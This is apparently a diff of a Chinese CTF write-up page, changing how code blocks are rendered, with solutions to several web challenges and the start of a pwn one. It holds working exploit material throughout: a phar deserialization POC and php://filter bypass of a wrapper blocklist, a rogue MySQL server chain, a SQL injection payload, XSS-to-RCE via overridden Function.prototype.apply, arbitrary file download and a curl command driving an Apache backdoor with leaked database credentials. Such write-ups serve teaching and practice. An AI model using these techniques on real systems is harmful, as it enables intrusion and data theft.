-这个题考的就是<code>finfo_file</code>触发 phar 反序列化，但是题目有以下限制：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#39;</span><span class=p>,</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>])){</span>
+这个题考的就是<code>finfo_file</code>触发 phar 反序列化，但是题目有以下限制：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#39;</span><span class=p>,</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>])){</span>
 </span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Go away!&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>ban 掉了 phar 开头的伪协议，还有一些考过的协议，发现还有 php 伪协议没有 ban ，于是可以利用类似于</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php://filter/read=convert.base64-encode/resource=phar://./1.phar
-</span></span></code></pre></div><p>这种形式来触发反序列化，所以基本外层都弄完了，下面看看内部怎么弄。</p><p>题目在 admin.php 中又给了一个反序列化，这个反序列化我们可以看到只能通过</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$admin</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Ad</span><span class=p>(</span><span class=nv>$ip</span><span class=p>,</span> <span class=nv>$port</span><span class=p>,</span> <span class=nv>$clazz</span><span class=p>,</span> <span class=nv>$func1</span><span class=p>,</span> <span class=nv>$func2</span><span class=p>,</span> <span class=nv>$func3</span><span class=p>,</span> <span class=nv>$arg1</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>,</span> <span class=nv>$arg3</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>ban 掉了 phar 开头的伪协议，还有一些考过的协议，发现还有 php 伪协议没有 ban ，于是可以利用类似于</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php://filter/read=convert.base64-encode/resource=phar://./1.phar
+</span></span></code></pre></td></tr></table></div></div><p>这种形式来触发反序列化，所以基本外层都弄完了，下面看看内部怎么弄。</p><p>题目在 admin.php 中又给了一个反序列化，这个反序列化我们可以看到只能通过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$admin</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Ad</span><span class=p>(</span><span class=nv>$ip</span><span class=p>,</span> <span class=nv>$port</span><span class=p>,</span> <span class=nv>$clazz</span><span class=p>,</span> <span class=nv>$func1</span><span class=p>,</span> <span class=nv>$func2</span><span class=p>,</span> <span class=nv>$func3</span><span class=p>,</span> <span class=nv>$arg1</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>,</span> <span class=nv>$arg3</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=nv>$admin</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>();</span>
-</span></span></code></pre></div><p>这样去触发了，又给了另几个反射类：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>check</span><span class=p>(){</span>
+</span></span></code></pre></td></tr></table></div></div><p>这样去触发了，又给了另几个反射类：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>check</span><span class=p>(){</span>
 </span></span><span class=line><span class=cl>    <span class=nv>$reflect</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span> <span class=o>=</span> <span class=nv>$reflect</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>();</span>
 </span></span><span class=line><span class=cl>
@@ -90,11 +164,48 @@
 </span></span><span class=line><span class=cl>    <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func3</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg3</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>参考<a href=https://paper.seebug.org/998/>TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>，这里其实就是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$m</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>();</span>
+</span></span></code></pre></td></tr></table></div></div><p>参考<a href=https://paper.seebug.org/998/>TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>，这里其实就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$m</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>();</span>
 </span></span><span class=line><span class=cl><span class=nv>$m</span><span class=o>-&gt;</span><span class=na>init</span><span class=p>();</span>
 </span></span><span class=line><span class=cl><span class=nv>$m</span><span class=o>-&gt;</span><span class=na>real_connect</span><span class=p>(</span><span class=s1>&#39;ip&#39;</span><span class=p>,</span><span class=s1>&#39;select 1&#39;</span><span class=p>,</span><span class=s1>&#39;select 1&#39;</span><span class=p>,</span><span class=s1>&#39;select 1&#39;</span><span class=p>,</span><span class=mi>3306</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=nv>$m</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=s1>&#39;select 1;&#39;</span><span class=p>);</span>
-</span></span></code></pre></div><p>在自己服务器上架一个 rogue mysql 就行了，然后文件参数为<code>phar://./upload/xxxx</code>，你上传的那个 phar 就行了，然后就可以在自己传入的那个端口拿到 flag 啦。</p><p>POC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span></code></pre></td></tr></table></div></div><p>在自己服务器上架一个 rogue mysql 就行了，然后文件参数为<code>phar://./upload/xxxx</code>，你上传的那个 phar 就行了，然后就可以在自己传入的那个端口拿到 flag 啦。</p><p>POC:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
 </span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>File</span><span class=p>{</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file_name</span><span class=p>;</span>
@@ -127,7 +238,7 @@
 </span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
 </span></span><span class=line><span class=cl><span class=nx>rename</span><span class=p>(</span><span class=s2>&#34;1.phar&#34;</span><span class=p>,</span> <span class=s2>&#34;1.gif&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><h3 id=easy_sql>easy_sql</h3><p>题目打开之后，会提示让我们输入flag，如果输入的内容与flag一样的话，则输出flag。
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=easy_sql>easy_sql</h3><p>题目打开之后，会提示让我们输入flag，如果输入的内容与flag一样的话，则输出flag。
 通过输入的字符串可以大致判断出后端逻辑是:
 $query||FLAG
 因此需要找到一种可以通过||带出flag的方式。在sql_mode，可以通过将其值设置为PIPE_AS_CONCAT改变||的作用为拼接字符串，此时随便输入一串字符串便能返回该字符串与FLAG拼接的内容。
@@ -135,14 +246,30 @@ $query||FLAG
 <img src=https://hackmd.summershrimp.com/uploads/upload_798e53bdb308c936d6e7c008f3bc58ba.png alt>
 <img src=https://hackmd.summershrimp.com/uploads/upload_669e9245c3c4e870eca0ea89ccf2718a.png alt></p><p>最终的payload为：
 1;set sql_mode=pipes_as_concat;select 1</p><p>由于出题出到一半时有事就放着了，最后放题时看有黑名单存在便以为出完了，结果导致了许多低级的非预期解。</p><h3 id=icloudmusic>iCloudMusic</h3><p>第一步的XSS不难，js_to_run中直接将歌单信息拼接到js中，引号+大括号逃逸即可。</p><p>拿到XSS怎样转化为RCE则考察怎样通过覆盖js原生函数来泄漏preload.js运行的node环境中的一些变量/函数等，这里有两种方法</p><ul><li>思路1 暴力重写js所有原生函数
-以Function.prototype.apply为例</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply2</span><span class=o>=</span><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=p>;</span>
+以Function.prototype.apply为例</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply2</span><span class=o>=</span><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=p>;</span>
 </span></span><span class=line><span class=cl><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=o>=</span><span class=kd>function</span><span class=p>(...</span><span class=nx>args</span><span class=p>){</span>
 </span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>args</span><span class=p>)</span>
 </span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>args</span><span class=p>[</span><span class=nx>i</span><span class=p>])</span>
 </span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>args</span><span class=p>[</span><span class=nx>i</span><span class=p>].</span><span class=nx>toString</span><span class=p>());</span>
 </span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span><span class=p>.</span><span class=nx>apply2</span><span class=p>(...</span><span class=nx>args</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>view的devtools执行这个函数后，尝试执行request.get一个url，可以在console中找到<code>process</code>.因此便可以将我们的覆盖脚本改写为：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply2</span><span class=o>=</span><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>view的devtools执行这个函数后，尝试执行request.get一个url，可以在console中找到<code>process</code>.因此便可以将我们的覆盖脚本改写为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply2</span><span class=o>=</span><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=p>;</span>
 </span></span><span class=line><span class=cl><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=o>=</span><span class=kd>function</span><span class=p>(...</span><span class=nx>args</span><span class=p>){</span>
 </span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>!=</span><span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=nx>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>!=</span><span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>args</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>env</span><span class=o>!=</span><span class=kc>undefined</span><span class=p>){</span>
 </span></span><span class=line><span class=cl>        <span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply</span><span class=o>=</span><span class=nb>Function</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>apply2</span><span class=p>;</span>
@@ -151,36 +278,87 @@ $query||FLAG
 </span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>this</span><span class=p>.</span><span class=nx>apply2</span><span class=p>(...</span><span class=nx>args</span><span class=p>)</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span><span class=line><span class=cl><span class=nx>request</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;http://www.baidu.com/&#39;</span><span class=p>,</span><span class=kc>null</span><span class=p>)</span>
-</span></span></code></pre></div><ul><li>思路2 白盒审计</li></ul><p>request库/http库/其他很多node库都有可能调用process相关的函数，其中process下有这样一个函数<code>nextTick</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>ƒ</span> <span class=p>(...</span><span class=nx>args</span><span class=p>)</span> <span class=p>{</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>思路2 白盒审计</li></ul><p>request库/http库/其他很多node库都有可能调用process相关的函数，其中process下有这样一个函数<code>nextTick</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>ƒ</span> <span class=p>(...</span><span class=nx>args</span><span class=p>)</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl>            <span class=nx>process</span><span class=p>.</span><span class=nx>activateUvLoop</span><span class=p>();</span>
 </span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>func</span><span class=p>.</span><span class=nx>apply</span><span class=p>(</span><span class=k>this</span><span class=p>,</span> <span class=nx>args</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span></code></pre></div><p>可以看到process.nextTick中调用了func.apply,即Function.prototype.apply,且参数this正是<code>process</code>本身。
-在http库中处理socket请求的一个关键函数即调用了这个函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>ClientRequest</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>onSocket</span> <span class=o>=</span> <span class=kd>function</span> <span class=nx>onSocket</span><span class=p>(</span><span class=nx>socket</span><span class=p>)</span> <span class=p>{</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以看到process.nextTick中调用了func.apply,即Function.prototype.apply,且参数this正是<code>process</code>本身。
+在http库中处理socket请求的一个关键函数即调用了这个函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>ClientRequest</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>onSocket</span> <span class=o>=</span> <span class=kd>function</span> <span class=nx>onSocket</span><span class=p>(</span><span class=nx>socket</span><span class=p>)</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl>  <span class=nx>process</span><span class=p>.</span><span class=nx>nextTick</span><span class=p>(</span><span class=nx>onSocketNT</span><span class=p>,</span> <span class=k>this</span><span class=p>,</span> <span class=nx>socket</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>};</span>
-</span></span></code></pre></div><p>request库处理请求都使用http库，且request库本身也多次调用了这个函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>defer</span> <span class=o>=</span> <span class=k>typeof</span> <span class=nx>setImmediate</span> <span class=o>===</span> <span class=s1>&#39;undefined&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>request库处理请求都使用http库，且request库本身也多次调用了这个函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>defer</span> <span class=o>=</span> <span class=k>typeof</span> <span class=nx>setImmediate</span> <span class=o>===</span> <span class=s1>&#39;undefined&#39;</span>
 </span></span><span class=line><span class=cl>  <span class=o>?</span> <span class=nx>process</span><span class=p>.</span><span class=nx>nextTick</span>
 </span></span><span class=line><span class=cl>  <span class=o>:</span> <span class=nx>setImmediate</span>
-</span></span></code></pre></div><p>知道这一点我们便可以直接给出我们同上的利用脚本。</p><h3 id=cocktails-remix>Cocktail&rsquo;s Remix</h3><p>1.从robots.txt可以得到根目录下页面。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>agent</span><span class=p>:</span> <span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><p>知道这一点我们便可以直接给出我们同上的利用脚本。</p><h3 id=cocktails-remix>Cocktail&rsquo;s Remix</h3><p>1.从robots.txt可以得到根目录下页面。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>agent</span><span class=p>:</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>info</span><span class=o>.</span><span class=n>php</span>
 </span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>download</span><span class=o>.</span><span class=n>php</span>
 </span></span><span class=line><span class=cl><span class=n>Disallow</span><span class=p>:</span> <span class=o>/</span><span class=n>config</span><span class=o>.</span><span class=n>php</span>
-</span></span></code></pre></div><p>2.从info.php页面可以发现Apache后门模块mod_cocktail。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_cocktail mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status
-</span></span></code></pre></div><p>3.通过download.php页面可以下载任意可读文件，包括mod_cocktail.so和config.php。
+</span></span></code></pre></td></tr></table></div></div><p>2.从info.php页面可以发现Apache后门模块mod_cocktail。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_cocktail mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status
+</span></span></code></pre></td></tr></table></div></div><p>3.通过download.php页面可以下载任意可读文件，包括mod_cocktail.so和config.php。
 下载方式:http://ip/download.php?filename=文件名
 下载数据库配置页面config.php
 http://ip/download.php?filename=config.php
 下载模块链接库mod_cocktail.so:
-http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4.下载config.php页面源码得到内网数据库地址，用户和密码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4.下载config.php页面源码得到内网数据库地址，用户和密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
 </span></span><span class=line><span class=cl>	<span class=c1>//$db_server = &#34;MysqlServer&#34;;
 </span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//$db_username = &#34;dba&#34;;
 </span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//$db_password = &#34;rNhHmmNkN3xu4MBYhm&#34;;	
 </span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>5.对mod_cocktail.so进行逆向，掌握后门利用方法。</p><p>对收到的HTTP请求头“Reffer”字段进行base64解码，并执行命令。</p><p>6.通过apache后门访问内网数据库获取flag值。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span></code></pre></td></tr></table></div></div><p>5.对mod_cocktail.so进行逆向，掌握后门利用方法。</p><p>对收到的HTTP请求头“Reffer”字段进行base64解码，并执行命令。</p><p>6.通过apache后门访问内网数据库获取flag值。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
 </span></span></span><span class=line><span class=cl><span class=cp></span>curl <span class=s1>&#39;http://127.0.0.1/1&#39;</span> -H <span class=s1>&#39;Reffer: bXlzcWwgLWggTXlzcWxTZXJ2ZXIgLXUgZGJhIC1wck5oSG1tTmtOM3h1NE1CWWhtIC1lICdzZWxlY3QgKiBmcm9tICBmbGFnLmZsYWc7Jw==&#39;</span>
 </span></span><span class=line><span class=cl><span class=c1>#Base64解码内容:mysql -h MysqlServer -u dba -prNhHmmNkN3xu4MBYhm -e &#39;select * from  flag.flag;&#39;</span>
-</span></span></code></pre></div><h2 id=pwn>Pwn</h2><h3 id=playfmt>playfmt</h3><p>一开始用C++泄露flag，子类继承于派生类，析构函数未写成虚析构</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>class</span> <span class=nc>base</span> <span class=p>{</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pwn>Pwn</h2><h3 id=playfmt>playfmt</h3><p>一开始用C++泄露flag，子类继承于派生类，析构函数未写成虚析构</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>class</span> <span class=nc>base</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
 </span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>str</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>	<span class=n>base</span><span class=p>()</span> <span class=p>{</span>
@@ -208,7 +386,25 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl>		<span class=k>this</span><span class=o>-&gt;</span><span class=n>flag</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>	<span class=p>}</span>
 </span></span><span class=line><span class=cl><span class=p>};</span>
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Testing my C++ skills...&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Testing my C++ skills...&#34;</span><span class=p>);</span>
